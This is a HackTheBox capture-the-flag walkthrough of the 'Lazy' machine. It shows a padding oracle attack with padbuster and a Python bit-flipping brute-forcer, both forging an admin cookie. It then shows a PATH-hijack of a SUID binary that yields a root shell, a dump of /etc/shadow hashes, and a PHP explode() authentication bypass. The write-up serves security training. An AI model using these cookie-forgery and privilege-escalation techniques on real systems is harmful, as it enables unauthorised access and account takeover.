---
title: HTB: Lazy
url: https://0xdf.gitlab.io/2020/07/29/htb-lazy.html
date: 2020-07-29T21:00:05+00:00
difficulty: Medium [30]
os: Linux
tags: hackthebox, htb-lazy, ctf, nmap, ubuntu, php, gobuster, cookies, python, crypto, burp, burp-repeater, padding-oracle, padbuster, firefox, bit-flip, ssh, suid, path-hijack, hashcat, penglab, gdb, ltrace, cyberchef, des, peda, debug
---

![Lazy](https://0xdfimages.gitlab.io/img/lazy-cover.png)

Lazy was a really solid old HackTheBox machine. It’s a medium difficulty box that requires identifying a unique and interesting cookie value and messing with it to get access to the admin account. I’ll show both a padding oracle attack and a bit-flipping attack that each allow me to change the encrypted data to grant admin access. That access provides an SSH key and a shell. To privesc, there’s a SetUID binary that is vulnerable to a path hijack attack. In Beyond Root, I’ll poke at the PHP source for the site, identify a third way to get logged in as admin, and do a bit of debugging on the SetUID binary.

## Box Info

| Name | [Lazy](https://hackthebox.com/machines/lazy)  [Lazy](https://hackthebox.com/machines/lazy) [Play on HackTheBox](https://hackthebox.com/machines/lazy) |
| --- | --- |
| Release Date | [03 May 2017](https://twitter.com/hackthebox_eu/status/859819303096287232) |
| Retire Date | 07 Oct 2017 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Lazy |
| Radar Graph | Radar chart for Lazy |
| First Blood User | 01:54:24[vagmour vagmour](https://app.hackthebox.com/users/82) |
| First Blood Root | 06:01:56[WhitfieldM WhitfieldM](https://app.hackthebox.com/users/104) |
| Creator | [trickster0 trickster0](https://app.hackthebox.com/users/169) |

## Recon

### nmap

`nmap` found two open TCP ports, SSH (22) and HTTP (80):

```

root@kali# nmap -p- --min-rate 10000 -oA scans/alltcp 10.10.10.18
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-28 10:34 EDT
Stats: 0:00:03 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 48.94% done; ETC: 10:34 (0:00:04 remaining)
Nmap scan report for 10.10.10.18
Host is up (0.016s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 8.33 seconds
root@kali# nmap -p 22,80 -sC -sV -oA scans/tcpscripts 10.10.10.18
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-28 14:27 EDT
Nmap scan report for 10.10.10.18
Host is up (0.012s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 e1:92:1b:48:f8:9b:63:96:d4:e5:7a:40:5f:a4:c8:33 (DSA)
|   2048 af:a0:0f:26:cd:1a:b5:1f:a7:ec:40:94:ef:3c:81:5f (RSA)
|   256 11:a3:2f:25:73:67:af:70:18:56:fe:a2:e3:54:81:e8 (ECDSA)
|_  256 96:81:9c:f4:b7:bc:1a:73:05:ea:ba:41:35:a4:66:b7 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: CompanyDev
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.49 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu 14.04 Trusty.

### Website - TCP 80

#### Site

The website is for ComanyDev, a company that makes software:

![image-20200728142951707](https://0xdfimages.gitlab.io/img/image-20200728142951707.png)

I checked `/index.php`, and it’s the same page.

The Register link, `/register.php` brings up a form that takes Username and Password:

![image-20200728143109686](https://0xdfimages.gitlab.io/img/image-20200728143109686.png)

When I try to register as username admin, it returns an error:

![image-20200728144919926](https://0xdfimages.gitlab.io/img/image-20200728144919926.png)

When I register as a unique name, I’m redirected back to `/index.php`, which shows the same site, replacing the message about registering and logging in with text that says I’m logged in:

![image-20200728143216360](https://0xdfimages.gitlab.io/img/image-20200728143216360.png)

#### Directory Brute Force

`gobuster` (with `-x php` since I know the site is PHP) shows nothing too interesting:

```

root@kali# gobuster dir -u http://10.10.10.18 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 40 -o scans/gobuster-root-med-php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.18
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/07/25 14:30:14 Starting gobuster
===============================================================
/images (Status: 301)
/index.php (Status: 200)
/register.php (Status: 200)
/header.php (Status: 200)
/footer.php (Status: 200)
/css (Status: 301)
/login.php (Status: 200)
/logout.php (Status: 302)
/classes (Status: 301)
/server-status (Status: 403)
===============================================================
2020/07/25 14:33:21 Finished
===============================================================

```

`/classes` does allow for directory listing:

![image-20200728143622044](https://0xdfimages.gitlab.io/img/image-20200728143622044.png)

None of the pages load anything, which is expected, as they are PHP files that are likely just imported functions by other pages. I will look at these in [Beyond Root](#website-source-analysis).

#### Cookies

When I login, the site sends back a redirect to `/index.php`, along with a new cookie:

```

Set-Cookie: auth=qsBiW9BCkWtobTAqj5rzE2mbGG7jZEX6HTTP/1.1 302 Found
Date: Tue, 28 Jul 2020 18:47:40 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.21
Set-Cookie: auth=qsBiW9BCkWtobTAqj5rzE2mbGG7jZEX6
Location: /index.php
Content-Length: 734
Connection: close
Content-Type: text/html

```

`auth` is not the standard PHP session management cookie, so it will be worth taking a look at.

## Shell as mitsos

### Cookie Analysis

#### Cookie Length

The `auth` cookie looks like base64-encoded data, but it doesn’t decode to ASCII:

```

root@kali# echo "qsBiW9BCkWtobTAqj5rzE2mbGG7jZEX6" | base64 -d | xxd
00000000: aac0 625b d042 916b 686d 302a 8f9a f313  ..b[.B.khm0*....
00000010: 699b 186e e364 45fa                      i..n.dE.

```

I tried usernames of different lengths to see if there was data stored in the cookie. A few normal looking usernames came back the same, but when I tried something really long, I got a longer cookie. I wrote a quick Python script to take a look (not necessary, but a good chance to practice coding and to explore):

```

#!/usr/bin/env python3 

import random
import requests
import string
import urllib.parse

for i in range(1,30):
    username = ''.join(random.choice(string.ascii_letters) for i in range(i))
    resp = requests.post('http://10.10.10.18/register.php', allow_redirects=False,
            data=f"username={username}&password=0xdf&password_again=0xdf",
            headers={"Content-Type": "application/x-www-form-urlencoded"})
    cookie = urllib.parse.unquote(resp.headers['Set-Cookie'].split('=')[1])
    print(f'[{i:2d}]  len(cookie): {len(cookie):2d}')

```

It just creates a username of random ascii letters for each length 1 to 29, then registers it, and prints out the length of the username and the password:

```

root@kali# python3 test_cookies.py 
[ 1]  len(cookie): 24
[ 2]  len(cookie): 24
[ 3]  len(cookie): 32
[ 4]  len(cookie): 32
[ 5]  len(cookie): 32
[ 6]  len(cookie): 32
[ 7]  len(cookie): 32
[ 8]  len(cookie): 32
[ 9]  len(cookie): 32
[10]  len(cookie): 32
[11]  len(cookie): 44
[12]  len(cookie): 44
[13]  len(cookie): 44
[14]  len(cookie): 44
[15]  len(cookie): 44
[16]  len(cookie): 44
[17]  len(cookie): 44
[18]  len(cookie): 44
[19]  len(cookie): 56
[20]  len(cookie): 56
[21]  len(cookie): 56
[22]  len(cookie): 56
[23]  len(cookie): 56
[24]  len(cookie): 56
[25]  len(cookie): 56
[26]  len(cookie): 56
[27]  len(cookie): 64
[28]  len(cookie): 64
[29]  len(cookie): 64

```

There is not only a change in the length of the cookie as the username length goes up, but also it’s clearly jumping in blocks. 3-10 all result in 32 bytes, then 11-18 create 44. Every eight bytes, the length of the cookie goes up by 12. If I were to base64-decode the cookie, I would find the length of the result is going up by eight each time.

Given my understanding of block ciphers and how padding works, I can guess that the content includes either five or thirteen bytes of static content plus my username. It’s not crazy to guess that static content might be “user=”.

#### Break Cookie

Given that this is likely block-encrypted data, I tried adding some characters to the end of my cookie to see what would happen, and it threw an error:

![image-20200728154600410](https://0xdfimages.gitlab.io/img/image-20200728154600410.png)

The `Invalid padding` error confirms what I had suspected, there’s some kind of block-encrypted data inside that cookie.

### Path 1: Padding Oracle Attack

#### Background

Padding Oracle is an attack against cipher block chaining (CBC) modes of encryption. Basically, if a user submits encrypted data to the application to decrypt, if the error back for bad padding is different from the error for bad information in the decrypted data, it is them possible to recover the entire plaintext.

This is a famous diagram describing CBC:

![image-20200729074429861](https://0xdfimages.gitlab.io/img/image-20200729074429861.png)

The attack is on what’s called the intermediate state, which is the block after the decryption before it’s XORed with the IV or previous block. This is important because plaintext = intermediate XOR previous. I know the previous, so if I can find the intermediate, I can calculate the plaintext.

It’s important to understand how padding works in PKCS5/7 (5 is for eight byte blocks, whereas 7 can do 1 to 255 bytes). To fill an incomplete block, it calculates the number of padding bytes, and then fills with that value. If the plaintext is exactly the block length (eight in this example), then an entire block of padding is added. The last block always has padding.

The attack works on one block at a time, so it will grab the first 16 bytes of the ciphertext, which is the eight byte IV and the first eight bytes of encrypted data. Then, fill the first seven bytes of the IV with anything, and submit 256 times with each possible value for the last byte in the IV. Most of the time, 255 of those will return a padding error, because the last intermediate byte XOR the last IV byte will not be 0x01, the correct final padding (final since I cut the ciphertext down so this is the final block). When there is no padding error, then the last plaintext byte generates must be 0x01. Knowing the last IV byte that generates a 0x01, that means I can xor what I submitted by 0x01 and get the intermediate byte at that position.

To move to the next byte, now I want to find plaintext ending in “0x0202”. Since I know the last byte of the intermediate, I can calculate the last IV byte needed to make that 0x02. Then I’ll test 256 options to find how to make the other byte 0x02, and now have the next intermediate value.

Once I have all eight intermediate bytes, I can simply xor those by the original legit IV to get the plaintext for that block. Once I am done with the first block, I can add the next block of ciphertext, and instead of sending a malicious IV, I’ll manipulate the previous block.

For more details with examples, check out [this post](https://robertheaton.com/2013/07/29/padding-oracle-attack/) or [this post](https://resources.infosecinstitute.com/padding-oracle-attack-2/).

#### padbuster

With an understanding of how the attack works (or really, even with just the high level understanding that we can differentiate padding errors from other errors), there is a tool that will automate this attack, [PadBuster](https://github.com/AonCyberLabs/PadBuster). I can install with `apt install padbuster`, and then run it. The usage from the help is:

```

Use: padbuster URL EncryptedSample BlockSize [options] 

```

I’ll run it with the following:
- [URL] - `http://10.10.10.18/index.php`
- [EncryptedSample] - `LreEXGNp3L%2FWgf071zsXoTJUyt1yEZ3U`, a valid cookie, and it’s smart enough to handle that url-encoded `%2F`.
- [BlockSize] - `8`, from the analysis above; it’ll almost always bee 8 or 16.
- `-cookies auth=LreEXGNp3L%2FWgf071zsXoTJUyt1yEZ3U` - show padbuster where to put the data
- `-encoding 0` - base64

I’ll run this, and the first thing it does it try 256 requests and ask me to say which is the padding error:

```

root@kali# padbuster http://10.10.10.18/index.php LreEXGNp3L%2FWgf071zsXoTJUyt1yEZ3U 8 -cookies auth=LreEXGNp3L%2FWgf071zsXoTJUyt1yEZ3U -encoding 0
+-------------------------------------------+                                           
| PadBuster - v0.3.3                        |                                           
| Brian Holyfield - Gotham Digital Science  |                                           
| labs@gdssecurity.com                      |                                           
+-------------------------------------------+                                           

INFO: The original request returned the following                                       
[+] Status: 200                             
[+] Location: N/A                           
[+] Content Length: 978                     

INFO: Starting PadBuster Decrypt Mode       
*** Starting Block 1 of 2 ***               

INFO: No error string was provided...starting response analysis                         
*** Response Analysis Complete ***          

The following response signatures were returned:                                        
-------------------------------------------------------                                 
ID#     Freq    Status  Length  Location                                                
-------------------------------------------------------                                 
1       1       200     1133    N/A         
2 **    255     200     15      N/A         
-------------------------------------------------------                                 

Enter an ID that matches the error condition                                            
NOTE: The ID# marked with ** is recommended :

```

In the table, 255 requests returned 15 bytes (`Invalid padding`), and one returned 1133 bytes (likely the logged in page). So the error is ID 2. I’ll enter that and hit enter to continue:

```

Continuing test with selection 2

[+] Success: (38/256) [Byte 8]              
[+] Success: (90/256) [Byte 7]              
[+] Success: (166/256) [Byte 6]             
[+] Success: (166/256) [Byte 5]             
[+] Success: (213/256) [Byte 4]             
[+] Success: (25/256) [Byte 3]              
[+] Success: (61/256) [Byte 2]              
[+] Success: (173/256) [Byte 1]             

Block 1 Results:                            
[+] Cipher Text (HEX): d681fd3bd73b17a1                                                 
[+] Intermediate Bytes (HEX): 5bc4e12e5e59a4db                                          
[+] Plain Text: user=0xd                    

Use of uninitialized value $plainTextBytes in concatenation (.) or string at /usr/bin/padbuster line 361, <STDIN> line 1.                                                        
*** Starting Block 2 of 2 ***               

[+] Success: (89/256) [Byte 8]              
[+] Success: (238/256) [Byte 7]             
[+] Success: (193/256) [Byte 6]             
[+] Success: (44/256) [Byte 5]              
[+] Success: (199/256) [Byte 4]             
[+] Success: (4/256) [Byte 3]               
[+] Success: (127/256) [Byte 2]             
[+] Success: (72/256) [Byte 1]              

Block 2 Results:                            
[+] Cipher Text (HEX): 3254cadd72119dd4                                                 
[+] Intermediate Bytes (HEX): b086fa3cd03c10a6                                          
[+] Plain Text: f                           
-------------------------------------------------------                                 
** Finished ***                             

[+] Decrypted value (ASCII): user=0xdf      

[+] Decrypted value (HEX): 757365723D3078646607070707070707                             

[+] Decrypted value (Base64): dXNlcj0weGRmBwcHBwcHBw==
-------------------------------------------------------  

```

It prints results for each completed block, and then a summary at the end. The data is `user=0xdf`. Knowing what the data is, I can also provide plaintext and it will return a valid encrypted cookie with that plaintext. I’ll add the `-plaintext user=admin` option, and run again:

```

root@kali# padbuster http://10.10.10.18/index.php LreEXGNp3L%2FWgf071zsXoTJUyt1yEZ3U 8 -cookies auth=LreEXGNp3L%2FWgf071zsXoTJUyt1yEZ3U -encoding 0 -plaintext user=admin                      
+-------------------------------------------+                                           
| PadBuster - v0.3.3                        |                                           
| Brian Holyfield - Gotham Digital Science  |                                           
| labs@gdssecurity.com                      |                                           
+-------------------------------------------+                                           

INFO: The original request returned the following                                       
[+] Status: 200                             
[+] Location: N/A                           
[+] Content Length: 978                     

INFO: Starting PadBuster Encrypt Mode       
[+] Number of Blocks: 2                     

INFO: No error string was provided...starting response analysis                         
*** Response Analysis Complete ***          

The following response signatures were returned:                                        
-------------------------------------------------------                                 
ID#     Freq    Status  Length  Location                                                
-------------------------------------------------------                                 
1       1       200     1133    N/A         
2 **    255     200     15      N/A         
-------------------------------------------------------                                 

Enter an ID that matches the error condition                                            
NOTE: The ID# marked with ** is recommended : 2                                         

Continuing test with selection 2            

[+] Success: (196/256) [Byte 8]             
[+] Success: (148/256) [Byte 7]             
[+] Success: (92/256) [Byte 6]              
[+] Success: (41/256) [Byte 5]              
[+] Success: (218/256) [Byte 4]             
[+] Success: (136/256) [Byte 3]             
[+] Success: (150/256) [Byte 2]             
[+] Success: (190/256) [Byte 1]             

Block 2 Results:
[+] New Cipher Text (HEX): 23037825d5a1683b                                             
[+] Intermediate Bytes (HEX): 4a6d7e23d3a76e3d                                          

[+] Success: (1/256) [Byte 8]               
[+] Success: (36/256) [Byte 7]              
[+] Success: (180/256) [Byte 6]             
[+] Success: (17/256) [Byte 5]              
[+] Success: (146/256) [Byte 4]             
[+] Success: (50/256) [Byte 3]              
[+] Success: (132/256) [Byte 2]             
[+] Success: (135/256) [Byte 1]             

Block 1 Results:                            
[+] New Cipher Text (HEX): 0408ad19d62eba93                                             
[+] Intermediate Bytes (HEX): 717bc86beb4fdefe                                          
-------------------------------------------------------                                 
** Finished ***                             

[+] Encrypted value is: BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA                                
------------------------------------------------------- 

```

It outputs a new cookie. I’ll go into Firefox Dev tools, Storage, Cookies, and update my cookie:

![image-20200728173303238](https://0xdfimages.gitlab.io/img/image-20200728173303238.png)

Now on visiting `/index.php`, I’m logged in:

![image-20200728173343387](https://0xdfimages.gitlab.io/img/image-20200728173343387.png)

It’s not immediately clear to me why that Joomla! logo is there, but there’s a link to “My Key”, which points to `http://10.10.10.18/mysshkeywithnamemitsos`. I’ll download that, and note that the filename indicates the username is mitsos.

### Path 2: Bit Flip Attack

#### Background

The server will get this cookie and decrypt it to figure out who the user is. What goes on in that process? Many encryption algorithms involve calculating either a stream or block of pseudorandom bytes and xor-ing those bytes against the cipher text to get the plaintext (or against the plaintext to get the ciphertext). The security relies on an attacker’s inability to reproduce the random string of bytes without the key that’s used to generate them.

But what if I don’t care about recovering the bytes or the key, but rather, just changing the data? If I flip a bit in the ciphertext, that effectively flips that same bit in the plaintext. If I guess that the data in the cookie has my username in it (which is likely given that the length of the cookie increases with the username length, even if in blocks), then I can try to register a user that’s one bit different from admin, and try flipping each bit to see if I can log in as admin. For a longer write-up of this technique, check out [this post](http://swepssecurity.blogspot.com/2014/05/bypassing-encrypted-session-tokens.html).

#### Exploit - Targeted

I’ll register the account qdmin. “q” is one bit different than “a”:

| Letter | hex | binary |
| --- | --- | --- |
| a | 0x61 | 0110 0001 |
| q | 0x71 | 0111 0001 |

I could replaced any character in admin with any other character one bit off.

If I successfully guessed that the plaintext is `user=qdmin`, then I can do this in a targeted way. I can see there are 24 bytes of ciphertext:

```

root@kali# echo "jQHLsfJNbqtkfIJHOMKjgJBdENqKUpEA" | base64 -d | xxd
00000000: 8d01 cbb1 f24d 6eab 647c 8247 38c2 a380  .....Mn.d|.G8...
00000010: 905d 10da 8a52 9100                      .]...R..

```

I want to target the data that will be XORed against the intermediate state. So to get the sixth byte (q –> a), I’ll flip the sixth byte in the IV, 0x4d. 0x4d is `0100 1101` in binary. To flip the bit that’s different between `a` and `q`, I’ll change it to `0101 1101`, which is 0x5d.

I can use `sed` to change that byte, and then `xxd -r` to convert back to binary and `base64` to encode:

```

root@kali# echo "jQHLsfJNbqtkfIJHOMKjgJBdENqKUpEA" | base64 -d | xxd | sed 's/ 38c2 / 38d2 /' | xxd -r | base64
jQHLsfJNbqtkfIJHONKjgJBdENqKUpEA

```

If I add this cookie and visit `index.php`, it gives the admin page.

#### Exploit - Brute

More likely is that I don’t know the structure of the underlying plaintext. There could be more information in the cookie than just the username. A more reliable attack is to brute over all the bits flipping each to see if it works.

There’s a way to do this attack using Burp Intruder, but I don’t have a copy of the pro version, and it’s so throttled that I can write a script to do it faster than running it. Here’s my Python script to try flipping each bit:

```

#!/usr/bin/env python3

import base64
import requests

def flip_bit(byte, pos):
    return byte ^ pow(2,pos)

cookie = 'jQHLsfJNbqtkfIJHOMKjgJBdENqKUpEA'
cookie_bin = base64.b64decode(cookie)

for i in range(len(cookie_bin)):
    for j in range(8):
        mod_byte = flip_bit(cookie_bin[i], j)
        mod_cookie_bin = cookie_bin[:i] + bytes([mod_byte]) + cookie_bin[i+1:]
        mod_cookie = base64.b64encode(mod_cookie_bin).decode()
        resp = requests.get('http://10.10.10.18/index.php', cookies={'auth': mod_cookie})
        if 'admin' in resp.text:
            print(f'Flip byte {i}, xor by 0x{pow(2,j):02x} - new cookie: {mod_cookie}')
            exit()

```

I created a helper function `flip_bit` which takes a byte and a position (0-7) and returns that byte with the bit in that one position flipped. It relies on the fact that the powers of two are words with a single bit on:

|  |  |  |  |
| --- | --- | --- | --- |
| 1 | 0000 0001 | 16 | 0001 0000 |
| 2 | 0000 0010 | 32 | 0010 0000 |
| 4 | 0000 0100 | 64 | 0100 0000 |
| 8 | 0000 1000 | 128 | 1000 0000 |

I’ll start with the cookie for qdmin and decode it to get the binary ciphertext. I will loop over each byte in the ciphertext, and for each byte loop over each bit. Each time I will flip one bit in the ciphertext, base64-encode it, and try a request with that modified cookie. If “admin” is in the page, I will print the cookie and exit.

This runs very quickly and returns a cookie:

```

root@kali# ./bitflipper.py 
Flip byte 5, xor by 0x10 - new cookie: jQHLsfJdbqtkfIJHOMKjgJBdENqKUpEA

```

Setting that cookie in Firefox gives the logged in admin page on refresh.

### SSH Access

With the key and the username, I can connect over SSH:

```

root@kali# ssh -i ~/keys/id_rsa_lazy_mitsos mitsos@10.10.10.18
load pubkey "/root/keys/id_rsa_lazy_mitsos": invalid format
The authenticity of host '10.10.10.18 (10.10.10.18)' can't be established.
ECDSA key fingerprint is SHA256:OJ5DTyZUGZXEpX4BKFNTApa88gR/+w5vcNathKIPcWE.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.18' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic i686)
 * Documentation:  https://help.ubuntu.com/

  System information as of Tue Jul 28 17:35:47 EEST 2020

  System load: 0.0               Memory usage: 4%   Processes:       192
  Usage of /:  7.6% of 18.58GB   Swap usage:   0%   Users logged in: 0

  Graph this data and manage this system at:
    https://landscape.canonical.com/

Last login: Thu Jan 18 10:29:40 2018
mitsos@LazyClown:~$

```

I can get `user.txt`:

```

mitsos@LazyClown:~$ cat user.txt
d558e792************************

```

## Priv: mitsos –> root

### Enumeration

In mitsos’ home directory there’s a root SUID binary `backup`, as well as a copy of [Peda](https://github.com/longld/peda), the reversing plugin that makes `gdb` more usable.

When I run `backup`, it outputs what looks like the contents of `/etc/shadow`, a file that should only be readable by root:

```

mitsos@LazyClown:~$ ./backup 
root:$6$v1daFgo/$.7m9WXOoE4CKFdWvC.8A9aaQ334avEU8KHTmhjjGXMl0CTvZqRfNM5NO2/.7n2WtC58IUOMvLjHL0j4OsDPuL0:17288:0:99999:7:::
daemon:*:17016:0:99999:7:::
bin:*:17016:0:99999:7:::
sys:*:17016:0:99999:7:::
sync:*:17016:0:99999:7:::
games:*:17016:0:99999:7:::
man:*:17016:0:99999:7:::
lp:*:17016:0:99999:7:::
mail:*:17016:0:99999:7:::
news:*:17016:0:99999:7:::
uucp:*:17016:0:99999:7:::
proxy:*:17016:0:99999:7:::
www-data:*:17016:0:99999:7:::
backup:*:17016:0:99999:7:::
list:*:17016:0:99999:7:::
irc:*:17016:0:99999:7:::
gnats:*:17016:0:99999:7:::
nobody:*:17016:0:99999:7:::
libuuid:!:17016:0:99999:7:::
syslog:*:17016:0:99999:7:::
messagebus:*:17288:0:99999:7:::
landscape:*:17288:0:99999:7:::
mitsos:$6$LMSqqYD8$pqz8f/.wmOw3XwiLdqDuntwSrWy4P1hMYwc2MfZ70yA67pkjTaJgzbYaSgPlfnyCLLDDTDSoHJB99q2ky7lEB1:17288:0:99999:7:::
mysql:!:17288:0:99999:7:::
sshd:*:17288:0:99999:7:::

```

I took those hashes and threw them into my [Penglab notebook](https://github.com/mxrch/penglab) to crack. These are SHA512 crypt, and will be very slow to break, but I might as well have it running in the background while I continue.

![image-20200729105757325](https://0xdfimages.gitlab.io/img/image-20200729105757325.png)

It did end up exhausting `rockyout.txt` without a match in about 10 minutes.

Continuing on, I’ll look at the binary itself. I could open the binary in `gdb` (as I take the presence of Peda to be a hint), but first I’ll run it with `ltrace` (I’ll use `gdb` in [Beyond Root](#re-backup)). This will show all the library calls made by the binary:

```

mitsos@LazyClown:~$ ltrace ./backup 
__libc_start_main(0x804841d, 1, 0xbffff7d4, 0x8048440 <unfinished ...>
system("cat /etc/shadow"cat: /etc/shadow: Permission denied
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                       = 256
+++ exited (status 0) +++

```

The first thing it does in `main` is call `system("cat /etc/shadow")`. This gets permissions denied because `ltrace` drops permissions on SUID binaries, so it’s not actually running as root, but it would be outside of `ltrace`.

### Path Hijack

The vulnerability here is that `cat` is called without a full path, which means that the shell is looking at each directory in the `$PATH` environment variable for an executable named `cat` until it finds one, and then runs it. By default, `$PATH` is:

```

mitsos@LazyClown:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games

```

But I can change the path to add `/tmp` at the front of the list:

```

mitsos@LazyClown:~$ PATH=/tmp:$PATH
mitsos@LazyClown:~$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games

```

Now `/tmp` will be the first directory checked.

I’ll drop a simple script into `/tmp/cat`. For demonstration, I’ll have it run `id`:

```

#!/bin/sh

id

```

Now when I run `./backup`, it runs my `cat`, which prints the `id` which shows an effective user id of root:

```

mitsos@LazyClown:~$ ./backup 
uid=1000(mitsos) gid=1000(mitsos) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare),1000(mitsos)

```

I can simply replace `id` with `/bin/sh`:

```

#!/bin/sh

/bin/sh

```

And now I `backup` returns a root shell:

```

mitsos@LazyClown:~$ ./backup 
# id
uid=1000(mitsos) gid=1000(mitsos) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare),1000(mitsos)

```

I can try to grab `root.txt`, but nothing comes:

```

# cat root.txt

```

I need to set the `$PATH` back so that it doesn’t call my `cat`, or I can use `tac` or `less` or `vim` or `grep .` or lots of other ways to get at file contents:

```

# PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
# cat root.txt
990b142c************************
# grep . root.txt
990b142c************************
# tac root.txt
990b142c************************

```

## Beyond Root

### Website Source Analysis

#### General Structure

I always I like to check out how the website works by looking at the files in `/var/www/html/`. The auth is based around a `User` class. In `login.php`, if `User::login` returns success, it then calls `User::createcookie` with the username and password. `register.php` checks that the right POST data is set, and that the username doesn’t contain `:`, and then passed to `User::Register`. If that succeeds, it calls `User::createcookie` and then redirects to `index.php`. Otherwise, it returns that the user already exists. `index.php` checks `$user` to print either the admin page, the logged in as non-admin page, or the not logged in page. There’s no verification against the database. All that matters is what’s in the cookie.

The `User` class is defined in `/var/www/html/classes/user.php`. It contains nine functions. The first five are public (callable from outside the class): `logout`, `createcookie`, `getuserfromcookie`, `login`, and `register`. The last four are helpers: `encryptString`, `decryptString`, `pkcs5_pad`, and `pkcs5_unpad`.

#### Encryption

`createcookie` seemed like a good place to start to understand the encryption:

```

  public static function createcookie($user, $password) {
    $string = "user=".$user;
    $passphrase = 'pntstrlb';
    return encryptString($string, $passphrase);

  }   

```

Simple enough. The string takes the form I already figured out of `user=[username]`. The passphrase is ‘pntstrlb’.

Looking at `encryptString`, it is using DES encryption in cipher block chaining (CBC) mode:

```

function encryptString($unencryptedText, $passphrase) { 
  $iv = mcrypt_create_iv( mcrypt_get_iv_size(MCRYPT_DES, MCRYPT_MODE_CBC), MCRYPT_RAND); 
  $text = pkcs5_pad($unencryptedText,8);
  $enc = mcrypt_encrypt(MCRYPT_DES, $passphrase, $text, MCRYPT_MODE_CBC, $iv); 
  return base64_encode($iv.$enc); 
}

```

It generates a random initialization vector (IV), pads the text using [PKCS5](https://www.cryptosys.net/pki/manpki/pki_paddingschemes.html) to a block size of eight (as I figured out above), and encrypts.

I can test this info out by dropping on my my cookies into [CyberChef](https://gchq.github.io/CyberChef). I don’t know a way to have CyberChef read the IV and ciphertext from the same stream, so I’ll start with a To HexDump and get the IV manually:

![image-20200729072013516](https://0xdfimages.gitlab.io/img/image-20200729072013516.png)

I can grab the first eight bytes and set them as the IV there (with the DES Decrypt turned off). Now I’ll replace the To Hexdump with a Drop bytes to remove the IV, and turn on the DES Decrypt:

![image-20200729072135002](https://0xdfimages.gitlab.io/img/image-20200729072135002.png)

#### auth.php

There’s a file, `auth.php` in the `classes` directory:

```

<?php
  session_start();
  require('../classes/db.php'); 
  require('../classes/user.php'); 

  if (isset($_POST["user"]) and isset($_POST["password"]) )
    if (User::login($_POST["user"],$_POST["password"]))  
      $_SESSION["admin"] = User::SITE;

  if (!isset($_SESSION["admin"] ) or $_SESSION["admin"] != User::SITE) {
    header( 'Location: /admin/login.php' ) ;
    die();
  }
  
?>

```

It’s not imported by any of the files, so I wonder if this was an original path that was later abandoned by the author but not removed. It is referencing a `/admin` which doesn’t exist.

### Alternative Authentication Bypass

One more thing jumped out looking at the source for `getuserfromcookie`:

```

  public static function getuserfromcookie($auth) {
    $passphrase = 'pntstrlb';
    $data = decryptString($auth, $passphrase);
    list($a, $user) = explode("=", $data);
    $sql = "SELECT * FROM users where login=\"";
    $sql.= mysql_real_escape_string($user);
    $sql.= "\"";
    $result = mysql_query($sql);
    if ($result) {
      if ($row = mysql_fetch_assoc($result)) {
        return $row['login'];
      }
      else {
        echo "User not found: ".htmlentities($user);
        return NULL;
      }
    }
    return NULL;
  }  

```

It takes the cookie, decrypts it using the passphrase, and the calls `explode` to split the string on `=` before querying the database with the username to see if the user exists. That `explode` actually causes an issue. I’ll open a php terminal to play with it (with `php -a`). The expected case does work:

```

php > $data = "user=admin";
php > list($a, $user) = explode("=", $data);
php > echo "a: " . $a . "\nuser: " . $user . "\n";
a: user
user: admin

```

The [docs](https://www.php.net/manual/en/function.explode.php) show that `explode` takes a delimiter, a string, and an optional limit on the number of times to split. This invocation doesn’t utilize the limit. So what happens if the cookie contains the username “admin=”.

```

php > $data = "user=admin=";
php > list($a, $user) = explode("=", $data);
php > echo "a: " . $a . "\nuser: " . $user . "\n";
a: user
user: admin

```

The string is split into “user”, “admin” and “”, and only the first two are captured (PHP is forgiving here not throwing an error for the length mismatch).

What happens when I try to register “admin=”? I noticed above that the only illegal character was “:”. `User::register` just puts it into the database as is.

This means that I can register admin= (with one or more =) and get back a cookie that will contain `user=admin=`. When I use that cookie on `index.php`, it will think my username is admin.

To give it a try:

![image-20200729073438961](https://0xdfimages.gitlab.io/img/image-20200729073438961.png)

On hitting login, I’m presented with the admin page.

### RE backup

